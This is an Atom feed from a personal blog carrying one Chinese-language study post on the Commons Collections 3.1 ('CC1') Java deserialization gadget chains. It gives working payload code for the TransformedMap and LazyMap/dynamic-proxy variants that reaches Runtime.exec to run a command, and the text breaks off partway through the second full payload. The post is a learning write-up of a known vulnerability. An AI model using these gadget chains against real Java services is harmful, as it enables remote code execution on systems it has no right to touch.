<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>F1v3&#39;s Notes</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://x-f1v3.github.io/"/>
  <updated>2020-11-05T08:09:12.821Z</updated>
  <id>http://x-f1v3.github.io/</id>
  
  <author>
    <name>F1v3</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Commonscollections1 反序列化</title>
    <link href="http://x-f1v3.github.io//blog/1604562905880.html"/>
    <id>http://x-f1v3.github.io//blog/1604562905880.html</id>
    <published>2020-11-05T07:55:05.000Z</published>
    <updated>2020-11-05T08:09:12.821Z</updated>
    
    <content type="html"><![CDATA[<p>Commonscollections 系列反序列化学习<br><a id="more"></a></p><h2 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Commons Collections 3.1</span><br><span class="line">jdk7或jdk8</span><br></pre></td></tr></table></figure><h2 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h2><h3 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">           AnnotationInvocationHandler.readObject()</span><br><span class="line">               Map(Proxy).setValue()</span><br><span class="line">                       TransformedMap.checkSetValue()</span><br><span class="line">                           ChainedTransformer.transform()</span><br><span class="line">                               ConstantTransformer.transform()</span><br><span class="line">                               InvokerTransformer.transform()</span><br><span class="line">                                   Method.invoke()</span><br><span class="line">                                       Class.getMethod()</span><br><span class="line">                               InvokerTransformer.transform()</span><br><span class="line">                                   Method.invoke()</span><br><span class="line">                                       Runtime.getRuntime()</span><br><span class="line">                               InvokerTransformer.transform()</span><br><span class="line">                                   Method.invoke()</span><br><span class="line">                                       Runtime.exec()</span><br></pre></td></tr></table></figure><p>按照触发流程，调试分析，先看 <code>InvokerTransformer</code> 类：<br><img src="http://x-f1v3.github.io/images/1604563052923.png" alt="image"></p><p>存在一个构造方法接收3个参数，包括方法名，参数类，参数值，<br>存在 <code>transform</code> 方法，接收的参数是某个类，然后反射调用这个类，并执行通过构造方法中所获得的方法，可以看到类、方法、参数都是从外部输入，也就是说能够执行任意类的含任意参数的任意方法。<br>在看 <code>ConstantTransformer</code> 类：</p><p><img src="http://x-f1v3.github.io/images/1604563132390.png" alt="image"></p><p>构造方法是接收一个任意类，<code>transform</code> 方法是无论参数是什么，都会直接返回通过构造方法获得的任意类，<br>接下来是 <code>ChainedTransformer</code> 类：</p><p><img src="http://x-f1v3.github.io/images/1604563153671.png" alt="image"></p><p>构造方法是接收一个 <code>Transformer</code> 类数组，<code>transform</code> 方法是依次执行 <code>Transformer</code> 类数组中每一个 <code>Transformer</code> 类的 <code>transform</code> 方法，且每一个<code>transform</code> 方法得到的返回值，都是后面的 <code>transform</code> 方法的参数。<br>而前面说到 <code>ConstantTransformer</code> 类的 <code>transform</code> 方法无论参数是什么，都会直接返回通过构造方法获得的任意类。这就非常适合当作 <code>Transformer</code> 类数组的第一个元素。再加上 <code>InvokerTransformer</code> 类的 <code>transform</code> 方法能够执行任意类的含任意参数的任意方法,就能够构造出执行命令的点：</p><p><img src="http://x-f1v3.github.io/images/1604563167594.png" alt="image"></p><p>payload：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,<span class="keyword">new</span> Class[] &#123;String.class &#125;,<span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">ChainedTransformer Chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Chain.transform(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>构造的 payload 也是非常巧妙，运用反射调用反射，仔细研究下的话，实际还是有点复杂的，需要对 Java 反射机制运用的非常熟练才行。<br>一行一行分析:<br><code>new ConstantTransformer(Runtime.class)</code> 由之前的分析得出会返回 <code>Runtime.class</code> 并且作为参数会传入到下个 <code>InvokerTransformer.transform</code> 中，<br><code>new InvokerTransformer(&quot;getMethod&quot;, new Class[]{ String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0] })</code> 得到 <code>Runtime.class</code> 参数，这里注意的是，由于传入的是 <code>Runtime.class</code> 是类，而不是类实例，所以 <code>input.getClass()</code> 得到的是 <code>java.lang.Class</code>,而不是 <code>java.lang.Runtime</code>:<br><img src="http://x-f1v3.github.io/images/1604563187942.png" alt="image"></p><p>这也是我们无法直接通过反射调用 <code>getRuntime</code> 方法，而需要通过反射调用反射调用<code>getRuntime</code> 方法的原因。这里通过反射调用 <code>getMethod</code> 方法，参数是 <code>getRuntime</code>。最后调用 <code>getMethod</code> 方法时，因为 <code>invoke</code> 的第一个参数还是 <code>Runtime.class</code>。所以后面能正确执行 <code>getRuntime</code> 方法。<br><img src="http://x-f1v3.github.io/images/1604563200521.png" alt="image"></p><p><code>new InvokerTransformer(&quot;invoke&quot;, new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]})</code>，这里就是通过反射调用 <code>invoke</code> 方法，执行前面的 <code>getMethod</code> 方法,相当于第二层反射，真正执行的是 <code>getRuntime</code>，最终返回 <code>Runtime</code> 实例。<br><img src="http://x-f1v3.github.io/images/1604563213543.png" alt="image"></p><p><code>new InvokerTransformer(&quot;exec&quot;,new Class[] {String.class },new Object[] {&quot;open /Applications/Calculator.app&quot;})</code> 最后执行 <code>Runtime</code> 实例的 <code>exec</code> 方法，执行系统命令。<br>为了方便理解，抽象出来的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object a = Runtime.class.getClass().getMethod(<span class="string">"getMethod"</span>,<span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;).invoke(Runtime.class,<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">Object b = a.getClass().getMethod(<span class="string">"invoke"</span>,<span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;).invoke(a,<span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;);</span><br><span class="line">b.getClass().getMethod(<span class="string">"exec"</span>,String.class ).invoke(b,<span class="string">"open /Applications/Calculator.app"</span>);</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1604563228530.png" alt="image"></p><p>看看其他大佬的图：<br><img src="http://x-f1v3.github.io/images/1604563240088.png" alt="image"></p><p>总的来说，第一层反射只是外壳，里面的通过反射调用 <code>getRuntime</code> 方法，获取 <code>Runtime</code> 实例是精华。大佬就是牛逼。<br>继续分析，既然通过一顿操作知道了 <code>ChainedTransformer.transform</code> 能够执行命令，那么还需要找到能自动触发这行代码的地方。<br>看到反序列化的利用链 <code>TransformedMap.checkSetValue()</code><br><img src="http://x-f1v3.github.io/images/1604563250718.png" alt="image"></p><p>可以看到该方法，会执行 <code>this.valueTransformer.transform(value)</code> ，而 <code>this.valueTransformer</code> 可以通过 <code>decorate</code> 方法进行赋值，同时也可以传入一个 <code>map</code>类。</p><blockquote><p>TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法，第三个参数为Map对象内的value要经过的转化方法。</p></blockquote><p>所以这段按照要求进行如下构造：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">    <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">    <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"1"</span>, <span class="string">"2"</span>);</span><br><span class="line">Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure></p><p>现在只需找到在某个类的 <code>readObject</code> 方法中直接或者间接调用 <code>TransformedMap.checkSetValue()</code> 即可。<br>直接看到反序列化利用链的 <code>AnnotationInvocationHandler.readObject</code> 方法：<br><img src="http://x-f1v3.github.io/images/1604563271107.png" alt="image"></p><p><code>this.memberValues</code> 和 <code>this.type</code> 都可以通过构造方法传入，也就是都是我们可控制的，<code>this.memberValues</code> 是 <code>Map</code> 类型，先不管前面的各种判断，假设都成立，定位到 $\color{rgb(255,0,0)}{var5.setValue}$，<code>var5</code> 就是传入 <code>map</code> 的一个 <code>Entry</code> 类，实际我们传入的是 <code>map</code> 的子类 <code>TransformedMap</code>, 而 <code>TransformedMap</code> 并没有 <code>setValue</code> 方法，所以往上追溯到其直接父类 <code>AbstractInputCheckedMapDecorator</code>:<br><img src="http://x-f1v3.github.io/images/1604563282617.png" alt="image"></p><p>可以看到，<code>setValue</code> 方法中，正好执行了 <code>checkSetValue</code> 方法，在父类中，<code>checkSetValue</code> 是抽象方法，所以会执行子类中的 <code>checkSetValue</code> ，也就是 <code>TransformedMap.checkSetValue()</code>,达到了我们想要的目的，至于具体如何执行到这个 <code>setValue</code> 方法，涉及到 <code>Map</code> 里的静态内部类 <code>MapEntry</code>、<code>EntrySet</code>和其他方法的联动，就不再赘述了。<br>重新整理 payload,加上利用 <code>AnnotationInvocationHandler.readObject</code>的部分：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">    <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">    <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"1"</span>, <span class="string">"2"</span>);</span><br><span class="line">Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object ins = cons.newInstance(注解类,transformedmap);</span><br></pre></td></tr></table></figure></p><p>现在就剩下最后一个问题了，就是如何满足 <code>readObject</code> 中的各种条件，重新看到该方法：<br><img src="http://x-f1v3.github.io/images/1604563296689.png" alt="image"></p><p>从构造方法可以看出 <code>this.type</code> 是注解类，<br><code>var2 = AnnotationType.getInstance(this.type)</code> 是获取该注解类的详细信息，<br><code>Map var3 = var2.memberTypes();</code> 获取该注解类的成员变量的名称及类型，这里需要对 java 的注解有个基本了解，以 <code>javax.xml.ws.Action</code> 这个注解为例，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Action &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//input是成员变量，String 是其类型，默认值是""</span></span><br><span class="line">    <span class="function">String <span class="title">input</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">    <span class="function">String <span class="title">output</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">    FaultAction[] fault() <span class="keyword">default</span> &#123; &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接下来就是对传入的 <code>this.memberValues</code> 和 <code>this.type</code> 相互校验：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Entry var5 = (Entry)var4.next();</span><br><span class="line">    <span class="comment">// var6 是 传入 map 的 key 值</span></span><br><span class="line">    String var6 = (String)var5.getKey();</span><br><span class="line">    <span class="comment">// var7 是根据 var6 取出的 注解成员变量的类，</span></span><br><span class="line">    Class var7 = (Class)var3.get(var6);</span><br><span class="line">    <span class="comment">// var7 不为空，也就是说传入 map 的 key 必须是传入注解类的 成员变量名</span></span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Object var8 = var5.getValue();</span><br><span class="line">        <span class="comment">//传入 map 的 value 值必须不是传入注解类的成员变量的类的实例化对象，</span></span><br><span class="line">        <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">            var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很明显的看出传入的 <code>map</code> 类和注解类要满足相关的条件，假设传入的注解类是 <code>javax.xml.ws.Action</code> ,那么按照以上分析的要求，<code>map</code> 的操作可以是<code>map.put(&quot;input&quot;, 1);</code>。<br>最终的 payload：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"> Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"input"</span>, <span class="number">1</span>);</span><br><span class="line"> Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">  Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Object ins = cons.newInstance(javax.xml.ws.Action.class,transformedmap);</span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line">    ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"tmp.cer"</span>));</span><br><span class="line">    outputStream.writeObject(ins);</span><br><span class="line">    outputStream.close();</span><br><span class="line">     ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"tmp.cer"</span>));</span><br><span class="line">    inputStream.readObject();</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1604563313656.png" alt="image"></p><h3 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>从 <code>ChainedTransformer.transform()</code> 往下之前都分析过了，直接看到 <code>LazyMap.get()</code><br><img src="http://x-f1v3.github.io/images/1604563326217.png" alt="image"></p><p>在 <code>get</code> 方法中，当 <code>map</code> 不包含 <code>key</code> 时，会执行 <code>this.factory.transform(key)</code>,其中 <code>this.factory</code> 是传入的 <code>Transformer</code> 类，这和下面的 <code>ChainedTransformer</code> 利用链就可以联动了。<br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">           new ConstantTransformer(Runtime.class),</span><br><span class="line">           new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">           new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ),</span><br><span class="line">           new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                   new Class[] &#123;String.class &#125;,</span><br><span class="line">                   new Object[] &#123;&quot;open /Applications/Calculator.app&quot;&#125;)</span><br><span class="line">   &#125;;</span><br><span class="line">Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = new HashMap();</span><br><span class="line">//调用 decorate 方法，返回 LazyMap 的实例</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">lazyMap.get(&quot;A&quot;);</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1604563338653.png" alt="image"></p><p>接下来是 <code>Map(Proxy).entrySet()</code><br>这里需要些 Java 动态代理的知识。简单的说，就是使用 JDK 动态代理时，会调用动态代理类的 invoke 方法，<br>而每一个动态代理类都必须要实现 <code>InvocationHandler</code> 这个接口,在看 <code>AnnotationInvocationHandler</code> ,就是一个动态代理类，<br><img src="http://x-f1v3.github.io/images/1604563349603.png" alt="image"></p><p>看到它的 <code>invoke</code> 方法，其中就有 <code>Object var6 = this.memberValues.get(var4);</code>，如果 <code>this.memberValues</code> 是构造好的 <code>LazyMap</code> 就能执行 <code>LazyMap.get()</code>了。<br>如何完成动态代理呢？一般通过 <code>Proxy</code> 的 <code>newProxyInstance</code> 完成动态代理</p><blockquote><p>public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)  throws IllegalArgumentException</p><p>loader: 定义了由哪个ClassLoader对象来对生成的代理对象进行加载,<br>interfaces: 将要给需要代理的对象提供一组什么接口，<br>h: 要调用实现的那种接口中的方法，会跳转到由这个代理对象关联到的 handler 中的invoke方法去执行,</p></blockquote><p>很明显，动态代理的 <code>InvocationHandler</code> 就是 <code>AnnotationInvocationHandler</code> 了。</p><p>继续看 <code>AnnotationInvocationHandler.readObject</code><br><img src="http://x-f1v3.github.io/images/1604563367123.png" alt="image"></p><p>其中有 <code>Map(Proxy).entrySet()</code> 对应到了 <code>this.memberValues.entrySet().iterator()</code>，也可以从 <code>AnnotationInvocationHandler</code> 的构造方法可以看出 <code>this.memberValues</code> 是 <code>Map</code> 类。如果反序列化入口点只能是 <code>AnnotationInvocationHandler</code> 类的话，那么最明显的思路就是初始化 <code>AnnotationInvocationHandler</code> 类的 <code>Map</code> 是经过传入 <code>lazyMap</code> 的 <code>AnnotationInvocationHandler</code> 实例动态代理的 <code>Map</code>。稍微有点绕口，代码比较清晰。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class,Map.class); </span><br><span class="line">handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler map_handler = (InvocationHandler) </span><br><span class="line"><span class="comment">//初始化AnnotationInvocationHandler，传入特殊构造的lazyMap</span></span><br><span class="line"><span class="comment">//这个AnnotationInvocationHandler实例，是作为动态代理的handler，</span></span><br><span class="line"><span class="comment">//所以，当执行代理对象的接口方法时，会关联到 handler 的 invoke 方法去执行</span></span><br><span class="line">handler_constructor.newInstance(Override.class,lazyMap); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用之前的 handler 处理动态代理 Map 对象</span></span><br><span class="line">Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler); </span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的AnnotationInvocationHandler是作为反序列化readObject的入口点</span></span><br><span class="line">Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br></pre></td></tr></table></figure></p><p>完整 Payload<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span 